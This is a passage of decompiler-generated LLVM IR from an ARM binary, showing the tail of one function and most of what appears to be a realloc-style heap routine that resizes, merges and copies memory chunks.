  uselistorder i32 %v0_10374, { 1, 0 }
  uselistorder i32 %v3_1034c, { 0, 2, 3, 1 }
  uselistorder i32 %v2_1033c, { 1, 0, 2 }
  uselistorder i32 %v3_102f4, { 2, 1, 0 }
  uselistorder i32 %v0_102e4, { 3, 2, 1, 0 }
  uselistorder i32 %v0_102b4, { 1, 0 }
  uselistorder i32 %v1_10268, { 2, 1, 0, 3 }
  uselistorder i32 %v0_10264, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_10208, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_101fc, { 1, 0 }
  uselistorder i32 %v3_101cc, { 1, 0 }
  uselistorder i32 %v0_101c0, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_101a0, { 0, 2, 1, 3 }
  uselistorder i1 %v7_10194, { 1, 0 }
  uselistorder i32 %v0_1016c, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r4.global-to-local, { 13, 0, 1, 2, 3, 4, 6, 5, 8, 9, 7, 10, 11, 12, 14, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 42, 39, 40, 41, 43, 44, 45, 46, 76, 77, 47, 48, 49, 50, 51, 52, 53, 54, 55, 60, 56, 57, 58, 59, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 82, 90, 75, 78, 79, 80, 81, 83, 84, 85, 86, 0, 87, 88, 89, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 50, 43, 44, 45, 46, 47, 48, 49, 51, 52, 53, 54, 55, 56, 57 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 47, 42, 43, 44, 45, 46, 48, 49, 50, 51, 52, 53, 54, 55 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 29, 3, 4, 5, 6, 18, 10, 7, 19, 8, 9, 12, 11, 16, 13, 20, 15, 14, 21, 17, 40, 23, 22, 24, 38, 27, 30, 28, 58, 31, 32, 59, 33, 34, 35, 36, 37, 42, 43, 39, 41, 48, 45, 44, 46, 47, 49, 26, 50, 51, 52, 53, 25, 54, 57, 56, 55, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 40, 21, 22, 33, 32, 41, 23, 42, 24, 25, 26, 27, 28, 29, 30, 31, 34, 35, 36, 37, 38, 39 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_12978, { 1, 0 }
  uselistorder i32 (i32)* @function_10098, { 1, 0 }
  uselistorder label %dec_label_pc_10a04, { 1, 0 }
  uselistorder label %dec_label_pc_109e8, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_109e4, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_109d4, { 1, 2, 0 }
  uselistorder label %bb168, { 1, 0 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %dec_label_pc_10968, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_108e4, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_108dc, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %.thread44, { 1, 0 }
  uselistorder label %.thread43, { 1, 0 }
  uselistorder label %.thread40, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_107b0, { 1, 0 }
  uselistorder label %.thread32, { 1, 0 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %bb153, { 1, 0 }
  uselistorder label %dec_label_pc_106e4, { 2, 0, 3, 1 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %.thread27, { 1, 0 }
  uselistorder label %dec_label_pc_1059c, { 0, 2, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_104f0, { 1, 0 }
  uselistorder label %dec_label_pc_104f8.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_104bc, { 1, 0 }
  uselistorder label %dec_label_pc_10470, { 1, 0 }
  uselistorder label %dec_label_pc_10404, { 1, 0 }
  uselistorder label %dec_label_pc_10400, { 1, 0 }
  uselistorder label %dec_label_pc_103ac, { 1, 0 }
  uselistorder label %dec_label_pc_10398, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10360, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1034c, { 1, 0 }
  uselistorder label %bb140, { 1, 0 }
  uselistorder label %bb138, { 1, 0 }
}

define i32 @function_10a18(i32 %arg1) local_unnamed_addr {
dec_label_pc_10a18:
  %v0_10a18 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10a18, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_10a18
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_10a18, %bb
  %v10_10a2c = phi i32 [ %arg1, %dec_label_pc_10a18 ], [ 0, %bb ]
  ret i32 %v10_10a2c

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_10a30(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10a30:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_10a30 = load i32, i32* @r4, align 4
  %v6_10a30 = load i32, i32* @r5, align 4
  %v9_10a30 = load i32, i32* @r6, align 4
  %v12_10a30 = load i32, i32* @r7, align 4
  %v15_10a30 = load i32, i32* @r8, align 4
  %v18_10a30 = load i32, i32* @sb, align 4
  %v21_10a30 = load i32, i32* @sl, align 4
  %v24_10a30 = load i32, i32* @fp, align 4
  %v27_10a30 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_10a3c = icmp eq i32* %arg1, null
  store i32 142964, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_10a3c, label %dec_label_pc_10a50, label %dec_label_pc_10a60

dec_label_pc_10a50:                               ; preds = %dec_label_pc_10a30
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v1_10a54 = call i32 @function_10110(i32 %arg2)
  store i32 %v1_10a54, i32* %r0.global-to-local, align 4
  store i32 %v1_10a54, i32* @r4, align 4
  br label %dec_label_pc_10db8

dec_label_pc_10a60:                               ; preds = %dec_label_pc_10a30
  %v2_10a60 = icmp eq i32 %arg2, 0
  br i1 %v2_10a60, label %dec_label_pc_10a68, label %dec_label_pc_10a74

dec_label_pc_10a68:                               ; preds = %dec_label_pc_10a60
  %v0_10a68 = call i32 @function_11048()
  store i32 %v0_10a68, i32* %r0.global-to-local, align 4
  %v0_10a6c = load i32, i32* @r6, align 4
  store i32 %v0_10a6c, i32* @r4, align 4
  br label %dec_label_pc_10db8

dec_label_pc_10a74:                               ; preds = %dec_label_pc_10a60
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_10a7c = load i32, i32* inttoptr (i32 143036 to i32*), align 4
  store i32 %v4_10a7c, i32* @r4, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 %v4_10a7c, i32* %r2.global-to-local, align 4
  %v4_10a88 = load i32, i32* inttoptr (i32 143000 to i32*), align 8
  store i32 %v4_10a88, i32* %r1.global-to-local, align 4
  %v2_10a8c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10a8c, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_10a94 = load i32, i32* inttoptr (i32 143040 to i32*), align 64
  call void @__pseudo_branch(i32 %v4_10a94)
  %v0_10aa0 = load i32, i32* @r4, align 4
  store i32 %v0_10aa0, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 142964, i32* %r1.global-to-local, align 4
  %v4_10aac = load i32, i32* inttoptr (i32 142980 to i32*), align 4
  store i32 %v4_10aac, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_10ab8.435 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_10aac)
  %v0_10ab8 = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_10ab8, -32
  br i1 %tmp36, label %dec_label_pc_10ad4, label %dec_label_pc_10ac0

dec_label_pc_10ac0:                               ; preds = %dec_label_pc_10a74
  %v0_10ac0 = call i32 @function_d0ec()
  store i32 %v0_10ac0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_10acc = inttoptr i32 %v0_10ac0 to i32*
  store i32 12, i32* %v2_10acc, align 4
  br label %dec_label_pc_10db8

dec_label_pc_10ad4:                               ; preds = %dec_label_pc_10a74
  %v1_10ad4 = add i32 %v0_10ab8, 11
  store i32 %v1_10ad4, i32* %r0.global-to-local, align 4
  %v0_10ad8 = load i32, i32* @r5, align 4
  %v1_10ad8 = add i32 %v0_10ad8, -4
  %v2_10ad8 = inttoptr i32 %v1_10ad8 to i32*
  %v3_10ad8 = load i32, i32* %v2_10ad8, align 4
  store i32 %v3_10ad8, i32* %r2.global-to-local, align 4
  %v2_10adc = icmp ugt i32 %v1_10ad4, 14
  %v7_10adc = icmp eq i32 %v1_10ad4, 15
  %v2_10ae0 = xor i1 %v2_10adc, true
  %v3_10ae0 = or i1 %v7_10adc, %v2_10ae0
  br i1 %v3_10ae0, label %bb, label %bb27

bb:                                               ; preds = %dec_label_pc_10ad4
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_10ad4, %bb
  %v2_10ae4 = xor i1 %v7_10adc, true
  %v3_10ae4 = and i1 %v2_10adc, %v2_10ae4
  br i1 %v3_10ae4, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_10ae4 = and i32 %v1_10ad4, -8
  store i32 %v5_10ae4, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_10ae8 = and i32 %v3_10ad8, 2
  %v2_10ae8 = icmp eq i32 %v1_10ae8, 0
  %v1_10aec = add i32 %v0_10ad8, -8
  store i32 %v1_10aec, i32* @sl, align 4
  %v1_10af0 = and i32 %v3_10ad8, -4
  store i32 %v1_10af0, i32* @r6, align 4
  br i1 %v2_10ae8, label %dec_label_pc_10af8, label %dec_label_pc_10cd0

dec_label_pc_10af8:                               ; preds = %bb29
  %v1_10af8 = load i32, i32* @sb, align 4
  %v3_10af8 = icmp ult i32 %v1_10af0, %v1_10af8
  br i1 %v3_10af8, label %dec_label_pc_10b04, label %bb30

bb30:                                             ; preds = %dec_label_pc_10af8
  store i32 %v1_10af0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10c68

dec_label_pc_10b04:                               ; preds = %dec_label_pc_10af8
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_10b0c = load i32, i32* inttoptr (i32 142996 to i32*), align 4
  store i32 %v4_10b0c, i32* %r0.global-to-local, align 4
  %v1_10b10 = add i32 %v4_10b0c, 44
  %v2_10b10 = inttoptr i32 %v1_10b10 to i32*
  %v3_10b10 = load i32, i32* %v2_10b10, align 4
  store i32 %v3_10b10, i32* %r3.global-to-local, align 4
  %v2_10b14 = add i32 %v1_10af0, %v1_10aec
  store i32 %v2_10b14, i32* @r4, align 4
  %v9_10b18 = icmp eq i32 %v2_10b14, %v3_10b10
  %v1_10b1c = add i32 %v2_10b14, 4
  %v2_10b1c = inttoptr i32 %v1_10b1c to i32*
  %v3_10b1c = load i32, i32* %v2_10b1c, align 4
  store i32 %v3_10b1c, i32* %r1.global-to-local, align 4
  br i1 %v9_10b18, label %dec_label_pc_10b24, label %dec_label_pc_10b60

dec_label_pc_10b24:                               ; preds = %dec_label_pc_10b04
  %v1_10b24 = and i32 %v3_10b1c, -4
  %v2_10b28 = add i32 %v1_10b24, %v1_10af0
  store i32 %v2_10b28, i32* %r1.global-to-local, align 4
  %v1_10b2c = add i32 %v1_10af8, 16
  store i32 %v1_10b2c, i32* %r3.global-to-local, align 4
  %v3_10b30 = icmp ult i32 %v2_10b28, %v1_10b2c
  br i1 %v3_10b30, label %dec_label_pc_10bb4, label %dec_label_pc_10b38

dec_label_pc_10b38:                               ; preds = %dec_label_pc_10b24
  %v2_10b38 = sub i32 %v2_10b28, %v1_10af8
  %v1_10b3c = urem i32 %v3_10ad8, 2
  %v2_10b40 = add i32 %v1_10af8, %v1_10aec
  store i32 %v2_10b40, i32* %r1.global-to-local, align 4
  %v2_10b44 = or i32 %v1_10af8, %v1_10b3c
  store i32 %v2_10b44, i32* %r2.global-to-local, align 4
  %v1_10b48 = or i32 %v2_10b38, 1
  store i32 %v1_10b48, i32* %r3.global-to-local, align 4
  store i32 %v0_10ad8, i32* @r4, align 4
  store i32 %v2_10b44, i32* %v2_10ad8, align 4
  %v0_10b54 = load i32, i32* %r1.global-to-local, align 4
  %v1_10b54 = load i32, i32* %r0.global-to-local, align 4
  %v2_10b54 = add i32 %v1_10b54, 44
  %v3_10b54 = inttoptr i32 %v2_10b54 to i32*
  store i32 %v0_10b54, i32* %v3_10b54, align 4
  %v0_10b58 = load i32, i32* %r3.global-to-local, align 4
  %v1_10b58 = load i32, i32* %r1.global-to-local, align 4
  %v2_10b58 = add i32 %v1_10b58, 4
  %v3_10b58 = inttoptr i32 %v2_10b58 to i32*
  store i32 %v0_10b58, i32* %v3_10b58, align 4
  br label %dec_label_pc_10d9c

dec_label_pc_10b60:                               ; preds = %dec_label_pc_10b04
  %v1_10b60 = and i32 %v3_10b1c, -2
  %v2_10b64 = add i32 %v1_10b60, %v2_10b14
  store i32 %v2_10b64, i32* %r3.global-to-local, align 4
  %v1_10b68 = add i32 %v2_10b64, 4
  %v2_10b68 = inttoptr i32 %v1_10b68 to i32*
  %v3_10b68 = load i32, i32* %v2_10b68, align 4
  store i32 %v3_10b68, i32* %r3.global-to-local, align 4
  %v1_10b6c = urem i32 %v3_10b68, 2
  %v2_10b6c = icmp eq i32 %v1_10b6c, 0
  br i1 %v2_10b6c, label %dec_label_pc_10b74, label %dec_label_pc_10bb4

dec_label_pc_10b74:                               ; preds = %dec_label_pc_10b60
  %v1_10b74 = and i32 %v3_10b1c, -4
  store i32 %v1_10b74, i32* %r3.global-to-local, align 4
  %v2_10b78 = add i32 %v1_10b74, %v1_10af0
  store i32 %v2_10b78, i32* %r0.global-to-local, align 4
  %v3_10b7c = icmp ult i32 %v2_10b78, %v1_10af8
  br i1 %v3_10b7c, label %dec_label_pc_10bb4, label %dec_label_pc_10b84

dec_label_pc_10b84:                               ; preds = %dec_label_pc_10b74
  %v1_10b84 = add i32 %v1_10af0, %v0_10ad8
  %v2_10b84 = inttoptr i32 %v1_10b84 to i32*
  %v3_10b84 = load i32, i32* %v2_10b84, align 4
  store i32 %v3_10b84, i32* %r1.global-to-local, align 4
  %v1_10b88 = add i32 %v3_10b84, 12
  %v2_10b88 = inttoptr i32 %v1_10b88 to i32*
  %v3_10b88 = load i32, i32* %v2_10b88, align 4
  store i32 %v3_10b88, i32* %r3.global-to-local, align 4
  %v9_10b8c = icmp eq i32 %v3_10b88, %v2_10b14
  %v1_10b90 = add i32 %v2_10b14, 12
  %v2_10b90 = inttoptr i32 %v1_10b90 to i32*
  %v3_10b90 = load i32, i32* %v2_10b90, align 4
  store i32 %v3_10b90, i32* %r2.global-to-local, align 4
  br i1 %v9_10b8c, label %dec_label_pc_10b98, label %dec_label_pc_10ba4

dec_label_pc_10b98:                               ; preds = %dec_label_pc_10b84
  %v1_10b98 = add i32 %v3_10b90, 8
  %v2_10b98 = inttoptr i32 %v1_10b98 to i32*
  %v3_10b98 = load i32, i32* %v2_10b98, align 4
  store i32 %v3_10b98, i32* %r3.global-to-local, align 4
  %v9_10b9c = icmp eq i32 %v3_10b98, %v2_10b14
  br i1 %v9_10b9c, label %dec_label_pc_10ba8, label %dec_label_pc_10ba4

dec_label_pc_10ba4:                               ; preds = %dec_label_pc_10b84, %dec_label_pc_10b98
  %v0_10ba4 = call i32 @function_112c4()
  store i32 %v0_10ba4, i32* %r0.global-to-local, align 4
  %v0_10ba8.pre = load i32, i32* @r1, align 4
  %v1_10ba8.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_10ba8

dec_label_pc_10ba8:                               ; preds = %dec_label_pc_10b98, %dec_label_pc_10ba4
  %v1_10ba8 = phi i32 [ %v3_10b90, %dec_label_pc_10b98 ], [ %v1_10ba8.pre, %dec_label_pc_10ba4 ]
  %v0_10ba8 = phi i32 [ %v3_10b84, %dec_label_pc_10b98 ], [ %v0_10ba8.pre, %dec_label_pc_10ba4 ]
  %v2_10ba8 = add i32 %v1_10ba8, 8
  %v3_10ba8 = inttoptr i32 %v2_10ba8 to i32*
  store i32 %v0_10ba8, i32* %v3_10ba8, align 4
  %v0_10bac = load i32, i32* %r2.global-to-local, align 4
  %v1_10bac = load i32, i32* %r1.global-to-local, align 4
  %v2_10bac = add i32 %v1_10bac, 12
  %v3_10bac = inttoptr i32 %v2_10bac to i32*
  store i32 %v0_10bac, i32* %v3_10bac, align 4
  %v1_10c68.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10c68

dec_label_pc_10bb4:                               ; preds = %dec_label_pc_10b24, %dec_label_pc_10b74, %dec_label_pc_10b60
  %v1_10bb4 = add i32 %v1_10af8, -7
  store i32 %v1_10bb4, i32* %r0.global-to-local, align 4
  %v1_10bb8 = call i32 @function_10110(i32 %v1_10bb4)
  store i32 %v1_10bb8, i32* @r0, align 4
  store i32 %v1_10bb8, i32* %r1.global-to-local, align 4
  %v2_10bbc = icmp eq i32 %v1_10bb8, 0
  br i1 %v2_10bbc, label %bb31, label %dec_label_pc_10bc8

bb31:                                             ; preds = %dec_label_pc_10bb4
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_10d9c

dec_label_pc_10bc8:                               ; preds = %dec_label_pc_10bb4
  %v1_10bd0.pre = load i32, i32* @r4, align 4
  %v1_10bc8 = add i32 %v1_10bb8, -4
  %v2_10bc8 = inttoptr i32 %v1_10bc8 to i32*
  %v3_10bc8 = load i32, i32* %v2_10bc8, align 4
  store i32 %v3_10bc8, i32* @r3, align 4
  %v1_10bcc = add i32 %v1_10bb8, -8
  store i32 %v1_10bcc, i32* @r7, align 4
  %v9_10bd0 = icmp eq i32 %v1_10bcc, %v1_10bd0.pre
  br i1 %v9_10bd0, label %.thread2, label %dec_label_pc_10be0

.thread2:                                         ; preds = %dec_label_pc_10bc8
  %v2_10bd4 = and i32 %v3_10bc8, -4
  store i32 %v2_10bd4, i32* %r3.global-to-local, align 4
  %v2_10bd8 = load i32, i32* @r6, align 4
  %v3_10bd8 = add i32 %v2_10bd8, %v2_10bd4
  store i32 %v3_10bd8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10c68

dec_label_pc_10be0:                               ; preds = %dec_label_pc_10bc8
  %v0_10be0 = load i32, i32* @r6, align 4
  %v1_10be0 = add i32 %v0_10be0, -4
  store i32 %v1_10be0, i32* @r2, align 4
  %v3_10be4 = udiv i32 %v1_10be0, 4
  store i32 %v3_10be4, i32* @ip, align 4
  %tmp37 = and i32 %v1_10be0, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_10bec = icmp ult i32 %v1_10be0, 36
  %v3_10bec = or i1 %tmp38, %v2_10bec
  %v0_10bfc = load i32, i32* @r5, align 4
  br i1 %v3_10bec, label %dec_label_pc_10bfc, label %dec_label_pc_10bf0

dec_label_pc_10bf0:                               ; preds = %dec_label_pc_10be0
  store i32 %v0_10bfc, i32* @r1, align 4
  %v0_10bf4 = call i32 @function_f700()
  store i32 %v0_10bf4, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_10bfc:                               ; preds = %dec_label_pc_10be0
  %v1_10bfc = inttoptr i32 %v0_10bfc to i32*
  %v2_10bfc = load i32, i32* %v1_10bfc, align 4
  store i32 %v2_10bfc, i32* %r3.global-to-local, align 4
  %v2_10c00 = inttoptr i32 %v1_10bb8 to i32*
  store i32 %v2_10bfc, i32* %v2_10c00, align 4
  %v0_10c04 = load i32, i32* @r5, align 4
  %v1_10c04 = add i32 %v0_10c04, 4
  %v2_10c04 = inttoptr i32 %v1_10c04 to i32*
  %v3_10c04 = load i32, i32* %v2_10c04, align 4
  store i32 %v3_10c04, i32* %r3.global-to-local, align 4
  %v1_10c08 = load i32, i32* %r1.global-to-local, align 4
  %v2_10c08 = add i32 %v1_10c08, 4
  %v3_10c08 = inttoptr i32 %v2_10c08 to i32*
  store i32 %v3_10c04, i32* %v3_10c08, align 4
  %v0_10c0c = load i32, i32* @r5, align 4
  %v1_10c0c = add i32 %v0_10c0c, 8
  %v2_10c0c = inttoptr i32 %v1_10c0c to i32*
  %v3_10c0c = load i32, i32* %v2_10c0c, align 4
  store i32 %v3_10c0c, i32* %r3.global-to-local, align 4
  %v0_10c10 = load i32, i32* @ip, align 4
  %v1_10c14 = load i32, i32* %r1.global-to-local, align 4
  %v2_10c14 = add i32 %v1_10c14, 8
  %v3_10c14 = inttoptr i32 %v2_10c14 to i32*
  store i32 %v3_10c0c, i32* %v3_10c14, align 4
  %tmp39 = icmp ult i32 %v0_10c10, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_10c1c

dec_label_pc_10c1c:                               ; preds = %dec_label_pc_10bfc
  %v0_10c1c = load i32, i32* @r5, align 4
  %v1_10c1c = add i32 %v0_10c1c, 12
  %v2_10c1c = inttoptr i32 %v1_10c1c to i32*
  %v3_10c1c = load i32, i32* %v2_10c1c, align 4
  store i32 %v3_10c1c, i32* %r3.global-to-local, align 4
  %v1_10c20 = load i32, i32* %r1.global-to-local, align 4
  %v2_10c20 = add i32 %v1_10c20, 12
  %v3_10c20 = inttoptr i32 %v2_10c20 to i32*
  store i32 %v3_10c1c, i32* %v3_10c20, align 4
  %v0_10c24 = load i32, i32* @r5, align 4
  %v1_10c24 = add i32 %v0_10c24, 16
  %v2_10c24 = inttoptr i32 %v1_10c24 to i32*
  %v3_10c24 = load i32, i32* %v2_10c24, align 4
  store i32 %v3_10c24, i32* %r3.global-to-local, align 4
  %v0_10c28 = load i32, i32* @ip, align 4
  %v1_10c2c = load i32, i32* %r1.global-to-local, align 4
  %v2_10c2c = add i32 %v1_10c2c, 16
  %v3_10c2c = inttoptr i32 %v2_10c2c to i32*
  store i32 %v3_10c24, i32* %v3_10c2c, align 4
  %tmp40 = icmp ult i32 %v0_10c28, 7
  br i1 %tmp40, label %.thread6, label %dec_label_pc_10c34

dec_label_pc_10c34:                               ; preds = %dec_label_pc_10c1c
  %v0_10c34 = load i32, i32* @r5, align 4
  %v1_10c34 = add i32 %v0_10c34, 20
  %v2_10c34 = inttoptr i32 %v1_10c34 to i32*
  %v3_10c34 = load i32, i32* %v2_10c34, align 4
  store i32 %v3_10c34, i32* %r3.global-to-local, align 4
  %v1_10c38 = load i32, i32* %r1.global-to-local, align 4
  %v2_10c38 = add i32 %v1_10c38, 20
  %v3_10c38 = inttoptr i32 %v2_10c38 to i32*
  store i32 %v3_10c34, i32* %v3_10c38, align 4
  %v0_10c3c = load i32, i32* @r5, align 4
  %v1_10c3c = add i32 %v0_10c3c, 24
  %v2_10c3c = inttoptr i32 %v1_10c3c to i32*
  %v3_10c3c = load i32, i32* %v2_10c3c, align 4
  store i32 %v3_10c3c, i32* %r3.global-to-local, align 4
  %v1_10c40 = load i32, i32* %r1.global-to-local, align 4
  %v2_10c40 = add i32 %v1_10c40, 24
  %v3_10c40 = inttoptr i32 %v2_10c40 to i32*
  store i32 %v3_10c3c, i32* %v3_10c40, align 4
  %v0_10c44 = load i32, i32* @ip, align 4
  %v7_10c44 = icmp eq i32 %v0_10c44, 9
  br i1 %v7_10c44, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_10c34
  %v1_10c48 = load i32, i32* @r5, align 4
  %v2_10c48 = add i32 %v1_10c48, 28
  %v3_10c48 = inttoptr i32 %v2_10c48 to i32*
  %v4_10c48 = load i32, i32* %v3_10c48, align 4
  store i32 %v4_10c48, i32* %r3.global-to-local, align 4
  %v2_10c4c = load i32, i32* %r1.global-to-local, align 4
  %v3_10c4c = add i32 %v2_10c4c, 28
  %v4_10c4c = inttoptr i32 %v3_10c4c to i32*
  store i32 %v4_10c48, i32* %v4_10c4c, align 4
  %v1_10c50 = load i32, i32* @r5, align 4
  %v2_10c50 = add i32 %v1_10c50, 32
  %v3_10c50 = inttoptr i32 %v2_10c50 to i32*
  %v4_10c50 = load i32, i32* %v3_10c50, align 4
  store i32 %v4_10c50, i32* %r3.global-to-local, align 4
  %v2_10c54 = load i32, i32* %r1.global-to-local, align 4
  %v3_10c54 = add i32 %v2_10c54, 32
  %v4_10c54 = inttoptr i32 %v3_10c54 to i32*
  store i32 %v4_10c50, i32* %v4_10c54, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_10c34, %dec_label_pc_10c1c, %dec_label_pc_10bfc, %dec_label_pc_10bf0, %bb32
  %v0_10c58 = load i32, i32* @r5, align 4
  store i32 %v0_10c58, i32* @r0, align 4
  %v0_10c5c = call i32 @function_11048()
  store i32 %v0_10c5c, i32* %r0.global-to-local, align 4
  %v0_10c60 = load i32, i32* @r7, align 4
  %v1_10c60 = add i32 %v0_10c60, 8
  store i32 %v1_10c60, i32* @r4, align 4
  br label %dec_label_pc_10d9c

dec_label_pc_10c68:                               ; preds = %bb30, %.thread2, %dec_label_pc_10ba8
  %v0_10c7c = phi i32 [ %v3_10bd8, %.thread2 ], [ %v1_10af0, %bb30 ], [ %v1_10c68.pre, %dec_label_pc_10ba8 ]
  %v0_10c68 = load i32, i32* @sb, align 4
  %v2_10c68 = sub i32 %v0_10c7c, %v0_10c68
  store i32 %v2_10c68, i32* %r1.global-to-local, align 4
  %v0_10c70 = load i32, i32* @sl, align 4
  %v1_10c70 = add i32 %v0_10c70, 4
  %v2_10c70 = inttoptr i32 %v1_10c70 to i32*
  %v3_10c70 = load i32, i32* %v2_10c70, align 4
  %tmp41 = icmp ugt i32 %v2_10c68, 15
  %v1_10c98 = urem i32 %v3_10c70, 2
  store i32 %v1_10c98, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_10c98, label %dec_label_pc_10c78

dec_label_pc_10c78:                               ; preds = %dec_label_pc_10c68
  %v2_10c7c = or i32 %v1_10c98, %v0_10c7c
  store i32 %v2_10c7c, i32* %r3.global-to-local, align 4
  store i32 %v2_10c7c, i32* %v2_10c70, align 4
  %v0_10c84 = load i32, i32* @sl, align 4
  %v1_10c84 = load i32, i32* %r0.global-to-local, align 4
  %v2_10c84 = add i32 %v1_10c84, %v0_10c84
  store i32 %v2_10c84, i32* %r2.global-to-local, align 4
  %v1_10c88 = add i32 %v2_10c84, 4
  %v2_10c88 = inttoptr i32 %v1_10c88 to i32*
  %v3_10c88 = load i32, i32* %v2_10c88, align 4
  %v1_10c8c = or i32 %v3_10c88, 1
  store i32 %v1_10c8c, i32* %r3.global-to-local, align 4
  store i32 %v1_10c8c, i32* %v2_10c88, align 4
  br label %dec_label_pc_10cc8

dec_label_pc_10c98:                               ; preds = %dec_label_pc_10c68
  %v2_10c9c = add i32 %v0_10c70, %v0_10c68
  store i32 %v2_10c9c, i32* %r0.global-to-local, align 4
  %v2_10ca0 = or i32 %v1_10c98, %v0_10c68
  store i32 %v2_10ca0, i32* %r3.global-to-local, align 4
  %v1_10ca4 = or i32 %v2_10c68, 1
  store i32 %v1_10ca4, i32* %r2.global-to-local, align 4
  store i32 %v2_10ca0, i32* %v2_10c70, align 4
  %v0_10cac = load i32, i32* %r2.global-to-local, align 4
  %v1_10cac = load i32, i32* %r0.global-to-local, align 4
  %v2_10cac = add i32 %v1_10cac, 4
  %v3_10cac = inttoptr i32 %v2_10cac to i32*
  store i32 %v0_10cac, i32* %v3_10cac, align 4
  %v0_10cb0 = load i32, i32* %r0.global-to-local, align 4
  %v1_10cb0 = load i32, i32* %r1.global-to-local, align 4
  %v2_10cb0 = add i32 %v1_10cb0, %v0_10cb0
  store i32 %v2_10cb0, i32* %r2.global-to-local, align 4
  %v1_10cb4 = add i32 %v2_10cb0, 4
  %v2_10cb4 = inttoptr i32 %v1_10cb4 to i32*
  %v3_10cb4 = load i32, i32* %v2_10cb4, align 4
  %v1_10cb8 = or i32 %v3_10cb4, 1
  store i32 %v1_10cb8, i32* %r3.global-to-local, align 4
  store i32 %v1_10cb8, i32* %v2_10cb4, align 4
  %v0_10cc0 = load i32, i32* %r0.global-to-local, align 4
